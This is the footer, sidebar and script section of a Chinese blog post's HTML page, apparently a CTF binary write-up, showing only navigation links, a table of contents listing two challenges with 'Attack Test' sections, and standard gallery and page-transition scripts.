<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/03/26/hfctf-2020-toka/">← 下一篇 HFCTF-2022 - TokameinE-二进制复现报告</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/03/06/systemkernel-chapter14/">《操作系统真象还原》chapter14/文件系统与遗憾 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/6.png" alt="Logo"></a><h1 id="Dr"><a href="TokameinE">TokameinE</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/ErodedElk"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" target="_blank" rel="noopener" href="https://space.bilibili.com/1782544616"><i class="fa-brands fa-bilibili" alt="BiliBili"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#smarCal"><span class="toc-number">1.</span> <span class="toc-text">smarCal</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%BB%E8%BE%91%E8%A7%A3%E8%AF%BB%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">逻辑解读：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#main"><span class="toc-number">1.1.1.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fork"><span class="toc-number">1.1.2.</span> <span class="toc-text">fork</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">源码分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Test"><span class="toc-number">1.3.</span> <span class="toc-text">Attack Test</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#d3fuse"><span class="toc-number">2.</span> <span class="toc-text">d3fuse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">2.1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">程序分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Attack-Test-1"><span class="toc-number">2.3.</span> <span class="toc-text">Attack Test</span></a></li></ol></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>